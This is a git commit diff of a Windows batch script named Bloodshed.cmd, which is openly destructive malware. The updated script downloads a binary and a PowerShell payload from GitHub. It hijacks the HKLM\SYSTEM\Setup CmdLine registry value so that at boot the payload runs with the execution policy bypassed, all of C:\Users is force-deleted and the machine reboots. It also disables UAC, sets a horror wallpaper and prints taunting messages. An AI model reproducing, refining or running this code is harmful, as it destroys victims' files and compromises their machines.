8721bd5111ee0cf8a46494ac48e629d506ce2348
Syed Shah <195543322+Syed930s@users.noreply.github.com>
2026-08-03 13:00:39 +0100

    Update Bloodshed.cmd

--- Bloodshed.cmd
+++ Bloodshed.cmd
@@ -1,18 +1,19 @@
 @echo off
 color A
+title BloodShed
 
-:init
-curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\bloodshed.bin
-setlocal DisableDelayedExpansion
-cls
-reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "cmd.exe /k powershell -command \"iex (irm 'https://raw.githubusercontent.com/Syed930s/CUTEB0YPAYL0AD/refs/heads/main/CuteBoyPayload.ps1')\" & ver >nul && del /f /s /q \Users && shutdown /r /t 0" /f
+curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin?raw=true" -o C:\bloodshed.bin
+curl -L "https://raw.githubusercontent.com/Syed930s/CUTEB0YPAYL0AD/refs/heads/main/CuteBoyPayload.ps1" -o C:\CuteBoyPayload.ps1
+
+reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\CuteBoyPayload.ps1 & del /f /s /q C:\Users & shutdown /r /t 5" /f
 reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
+
 curl -L "https://wallpaperbat.com/down/409151-dark-evil-horror-spooky-creepy-scary-wallpaper-2560x1440" -o C:\DeathNet.png
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\DeathNet.png" /f
 start explorer.exe
-ECHO Your PC has been Bloodsheded by The Bloodshed...
-echo Don't reboot friend!
 
+echo Your PC has been Bloodshedded by The Bloodshed...
+echo Don't reboot, friend! The payload will run on next boot.
